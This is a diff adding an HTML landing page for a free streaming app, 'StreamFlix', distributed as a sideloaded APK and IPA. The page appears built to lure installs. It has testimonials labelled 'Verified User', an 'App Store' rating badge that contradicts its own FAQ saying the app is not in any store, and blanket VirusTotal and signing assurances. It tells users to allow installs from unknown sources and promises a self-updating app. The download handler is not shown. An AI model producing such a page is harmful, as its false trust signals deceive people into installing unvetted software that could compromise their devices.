+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+      </div>
+      <div>
+        <div class="hero-badge-num">50M+</div>
+        <div class="hero-badge-label" data-i18n="hero_stat1">Active Users</div>
+      </div>
+    </div>
+    <div class="hero-badge">
+      <div class="hero-badge-icon purple">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+      </div>
+      <div>
+        <div class="hero-badge-num">4.8★</div>
+        <div class="hero-badge-label" data-i18n="hero_stat2">App Store</div>
+      </div>
+    </div>
+    <div class="hero-badge">
+      <div class="hero-badge-icon cyan">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg>
+      </div>
+      <div>
+        <div class="hero-badge-num">4K HDR</div>
+        <div class="hero-badge-label" data-i18n="hero_stat3">Quality</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CTA -->
+  <button class="hero-cta" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    <span data-i18n="hero_cta">Download Free — Start Watching</span>
+  </button>
+
+  <div class="scroll-hint">
+    <span data-i18n="scroll_hint">Swipe</span>
+    <div class="scroll-hint-line"></div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SCREEN 2: TRENDING NOW
+     ============================================================ -->
+<section class="section reveal">
+  <span class="section-label" data-i18n="trending_label">Trending Now</span>
+  <h2 class="section-title"><span data-i18n="trending_h_a">What the world</span><br><span data-i18n="trending_h_b">is watching</span></h2>
+  <p class="section-sub" style="margin-bottom:14px" data-i18n="trending_sub">Top picks, updated daily</p>
+
+  <div class="trending-scroll">
+    <!-- Card 1 -->
+    <div class="trending-card">
+      <div class="trending-card-media">
+        <img src="img/1a.jpg" alt="Dune: Part Three" loading="lazy" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0">
+        <div class="trending-card-rank">1</div>
+        <button class="trending-play-btn" onclick="k2()" aria-label="Play Dune">
+          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg>
+        </button>
+      </div>
+      <span class="trending-card-label hot" data-i18n="card_hot">HOT</span>
+      <div class="trending-card-info">
+        
+      </div>
+    </div>
+
+    <!-- Card 2 -->
+    <div class="trending-card">
+      <div class="trending-card-media">
+        <img src="img/2a.jpg" alt="Stranger Things" loading="lazy" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0">
+        <div class="trending-card-rank">2</div>
+        <button class="trending-play-btn" onclick="k2()" aria-label="Play Stranger Things">
+          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg>
+        </button>
+      </div>
+      <span class="trending-card-label new" data-i18n="card_new">NEW</span>
+      <div class="trending-card-info">
+        
+      </div>
+    </div>
+
+    <!-- Card 3 -->
+    <div class="trending-card">
+      <div class="trending-card-media">
+        <img src="img/3a.jpg" alt="The Last Kingdom" loading="lazy" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0">
+        <div class="trending-card-rank">3</div>
+        <button class="trending-play-btn" onclick="k2()" aria-label="Play The Last Kingdom">
+          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg>
+        </button>
+      </div>
+      <span class="trending-card-label top" data-i18n="card_top">TOP</span>
+      <div class="trending-card-info">
+       
+      </div>
+    </div>
+
+    <!-- Card 4 -->
+    <div class="trending-card">
+      <div class="trending-card-media">
+        <img src="img/4a.jpg" alt="Blade 2099" loading="lazy" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0">
+        <div class="trending-card-rank">4</div>
+        <button class="trending-play-btn" onclick="k2()" aria-label="Play Blade 2099">
+          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg>
+        </button>
+      </div>
+      <span class="trending-card-label new" data-i18n="card_4k">4K</span>
+      <div class="trending-card-info">
+        
+      </div>
+    </div>
+
+    <!-- Card 5 -->
+    <div class="trending-card">
+      <div class="trending-card-media">
+        <img src="img/6a.jpg" alt="Eclipse: Awakening" loading="lazy" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0">
+        <div class="trending-card-rank">5</div>
+        <button class="trending-play-btn" onclick="k2()" aria-label="Play Eclipse">
+          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg>
+        </button>
+      </div>
+      <span class="trending-card-label new" data-i18n="card_hd">HD</span>
+      <div class="trending-card-info">
+        
+      </div>
+    </div>
+  </div>
+ 
+
+  <!-- Live stats bar -->
+  <div class="live-bar">
+    <div class="live-stat">
+      <div class="live-stat-val red">10K+</div>
+      <div class="live-stat-lbl" data-i18n="live_titles">Titles</div>
+    </div>
+    <div class="live-divider"></div>
+    <div class="live-stat">
+      <div class="live-stat-val purple">4.8★</div>
+      <div class="live-stat-lbl" data-i18n="live_rating">Rating</div>
+    </div>
+    <div class="live-divider"></div>
+    <div class="live-stat">
+      <div class="live-stat-val cyan">50M+</div>
+      <div class="live-stat-lbl" data-i18n="live_downloads">Downloads</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SCREEN 3: FEATURES
+     ============================================================ -->
+<section class="section reveal" style="padding-top:8px">
+  <span class="section-label" data-i18n="feat_label">Why StreamFlix</span>
+  <h2 class="section-title"><span data-i18n="feat_h_a">Everything you</span><br><span data-i18n="feat_h_b">need. Nothing you don't.</span></h2>
+
+  <div class="feat-grid" style="margin-top:16px">
+    <div class="feat-card">
+      <div class="feat-icon r">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg>
+      </div>
+      <h4 data-i18n="feat1_h">4K HDR</h4>
+      <p data-i18n="feat1_p">Dolby Vision & Atmos. Cinema-grade quality in your hands.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon p">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      </div>
+      <h4 data-i18n="feat2_h">Offline Mode</h4>
+      <p data-i18n="feat2_p">Download anything. Watch on planes, trains, anywhere.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon c">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+      </div>
+      <h4 data-i18n="feat3_h">Multi-Device</h4>
+      <p data-i18n="feat3_p">Phone, tablet, TV — pause on one, resume on another.</p>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon g">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+      </div>
+      <h4 data-i18n="feat4_h">Early Access</h4>
+      <p data-i18n="feat4_p">Exclusive premieres & behind-the-scenes before anyone else.</p>
+    </div>
+  </div>
+ 
+
+  <!-- Big feature card -->
+  <div class="big-feat">
+    <div class="big-feat-glow"></div>
+    <h3 data-i18n="bigfeat_h">⚡ Watch together, even apart</h3>
+    <ul class="big-feat-list">
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        <span data-i18n="bigfeat_1"><strong style="color:#fff">Sync Play</strong> — watch in perfect sync with friends, anywhere in the world</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        <span data-i18n="bigfeat_2"><strong style="color:#fff">5 Profiles</strong> — each with personalized recommendations</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        <span data-i18n="bigfeat_3"><strong style="color:#fff">Kids Mode</strong> — safe, curated content for the little ones</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        <span data-i18n="bigfeat_4"><strong style="color:#fff">AI Subtitles</strong> — real-time translation in 40+ languages</span>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================================================
+     SCREEN 4: SOCIAL PROOF
+     ============================================================ -->
+<section class="section reveal" style="padding-top:8px">
+  <span class="section-label" data-i18n="reviews_label">Loved by Millions</span>
+  <h2 class="section-title"><span data-i18n="reviews_h_a">Don't take our</span><br><span data-i18n="reviews_h_b">word for it</span></h2>
+
+  <div class="reviews-wrap" style="margin-top:14px">
+    <div class="review-card">
+      <div class="review-stars">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-body" data-i18n="review1">"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."</p>
+      <div class="review-author">
+        <div class="review-avatar">S</div>
+        <div>
+          <div class="review-name">Sarah Mitchell</div>
+          <div class="review-role" data-i18n="verified_user">Verified User</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="review-card">
+      <div class="review-stars">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-body" data-i18n="review2">"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."</p>
+      <div class="review-author">
+        <div class="review-avatar" style="background:linear-gradient(135deg,#7C3AED,#3B82F6)">J</div>
+        <div>
+          <div class="review-name">James Rodriguez</div>
+          <div class="review-role" data-i18n="verified_user">Verified User</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="review-card">
+      <div class="review-stars">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-body" data-i18n="review3">"Kids Mode is a lifesaver. My children have their own space and I don't worry about what they'll find. Best streaming app for families hands down."</p>
+      <div class="review-author">
+        <div class="review-avatar" style="background:linear-gradient(135deg,#059669,#22C55E)">E</div>
+        <div>
+          <div class="review-name">Emily Chen</div>
+          <div class="review-role" data-i18n="verified_user">Verified User</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Global stats -->
+  <div class="global-stats">
+    <div class="global-stat">
+      <div class="global-stat-num a">50M+</div>
+      <div class="global-stat-lbl" data-i18n="stat1">Downloads Worldwide</div>
+    </div>
+    <div class="global-stat">
+      <div class="global-stat-num b">4.8★</div>
+      <div class="global-stat-lbl" data-i18n="stat2">Average Rating</div>
+    </div>
+    <div class="global-stat">
+      <div class="global-stat-num c">190</div>
+      <div class="global-stat-lbl" data-i18n="stat3">Countries Available</div>
+    </div>
+    <div class="global-stat">
+      <div class="global-stat-num d">99.9%</div>
+      <div class="global-stat-lbl" data-i18n="stat4">Uptime Guarantee</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SCREEN 5: DOWNLOAD
+ 
+
+<!-- ============================================================
+     SCREEN 6: APK SECURITY
+     ============================================================ -->
+<section class="section reveal" style="padding-top:8px">
+  <span class="section-label" data-i18n="sec_label">Safe & Verified</span>
+  <h2 class="section-title"><span data-i18n="sec_h_a">Your security</span><br><span data-i18n="sec_h_b">is our priority</span></h2>
+  <p class="section-sub" style="margin-bottom:14px" data-i18n="sec_sub">Every release is scanned, signed, and verified before it reaches you.</p>
+
+  <div class="security-strip">
+    <div class="security-item">
+      <div class="security-item-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+      </div>
+      <div class="security-item-text"><span data-i18n="sec1_a">VirusTotal Scanned</span><span data-i18n="sec1_b">100% clean · 72 engines passed</span></div>
+    </div>
+    <div class="security-item">
+      <div class="security-item-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>
+      </div>
+      <div class="security-item-text"><span data-i18n="sec2_a">SHA-256 Signed</span><span data-i18n="sec2_b">Cryptographically verified · tamper-proof</span></div>
+    </div>
+    <div class="security-item">
+      <div class="security-item-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      </div>
+      <div class="security-item-text"><span data-i18n="sec3_a">Auto-Update</span><span data-i18n="sec3_b">Get the latest version as soon as we release</span></div>
+    </div>
+    <div class="security-item">
+      <div class="security-item-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="3"/><path d="M4.93 4.93l1.41 1.41"/><path d="M17.66 17.66l1.41 1.41"/></svg>
+      </div>
+      <div class="security-item-text"><span data-i18n="sec4_a">No Permissions Abuse</span><span data-i18n="sec4_b">Only requests what's strictly needed</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SCREEN 7: FAQ
+     ============================================================ -->
+<section class="section reveal" style="padding-top:8px;padding-bottom:100px">
+  <span class="section-label" data-i18n="faq_label">FAQ</span>
+  <h2 class="section-title"><span data-i18n="faq_h_a">Got questions?</span><br><span data-i18n="faq_h_b">We've got answers.</span></h2>
+
+  <div class="faq-list" style="margin-top:16px">
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq1_q">Is the APK safe to install?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq1_a">Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.</div></div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq2_q">Why isn't the app on Google Play or App Store?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq2_a">We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.</div></div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq3_q">How do I install the APK on Android?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq3_a">1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you're done! The app will auto-update itself after that — no need to manually download future versions.</div></div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq4_q">Is it really free? What's the catch?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq4_a">Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!</div></div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq5_q">Which devices and OS versions are supported?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq5_a">Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.</div></div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq6_q">How do I get updates after installing?</span>
+        <div class="faq-q-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></div>
+      </div>
+      <div class="faq-a"><div class="faq-a-inner" data-i18n="faq6_a">The app has a built-in auto-updater. When a new version is available, you'll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="page-footer">
+  <span data-i18n="footer_copy">© 2026 StreamFlix</span> · <a href="#" style="color:var(--fg-muted)" data-i18n="footer_priv">Privacy</a> · <a href="#" style="color:var(--fg-muted)" data-i18n="footer_terms">Terms</a> · <a href="#" style="color:var(--fg-muted)" data-i18n="footer_sec">Security</a>
+</footer>
+
+</div><!-- /page-content -->
+
+<!-- ============================================================
+     STICKY FLOATING DOWNLOAD BUTTON
+     ============================================================ -->
+<div class="float-bar" id="floatBar">
+  <button class="float-bar-cta" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    <span data-i18n="float_cta">Download Free</span>
+  </button>
+</div>
+
+<!-- ============================================================
+     SCRIPTS
+     ============================================================ -->
+
+
+<script>
+// ---- Floating bar logic ----
+var floatBar=document.getElementById('floatBar');
+
+function updateBar(){
+  if(window.scrollY>window.innerHeight*0.7){
+    floatBar.classList.add('on');
+  }else{
+    floatBar.classList.remove('on');
+  }
+}
+
+window.addEventListener('scroll',updateBar,{passive:true});
+
+// ---- Scroll reveal ----
+var revealObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}
+  });
+},{threshold:0.12,rootMargin:'0px 0px -30px 0px'});
+
+document.querySelectorAll('.reveal').forEach(function(el){revealObserver.observe(el)});
+
+// ---- Category pill toggle ----
+document.querySelectorAll('.cat-pill').forEach(function(pill){
+  pill.addEventListener('click',function(){
+    document.querySelectorAll('.cat-pill').forEach(function(p){p.classList.remove('on')});
+    pill.classList.add('on');
+  });
+});
+
+// Initial check
+updateBar();
+
+// ---- FAQ accordion ----
+function toggleFaq(q){
+  var item=q.parentElement;
+  var wasOpen=item.classList.contains('open');
+  // Close all
+  document.querySelectorAll('.faq-item').forEach(function(i){i.classList.remove('open')});
+  // Toggle clicked (unless it was already open)
+  if(!wasOpen)item.classList.add('open');
+}
+</script>
+
+<!-- i18n Language System -->
+<script>
+(function(){
+var T={
+en:{
+hero_eyebrow:'#1 Entertainment App · 2026',
+hero_title_a:'Cinema in your',
+hero_title_b:'pocket',
+hero_desc:'Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.',
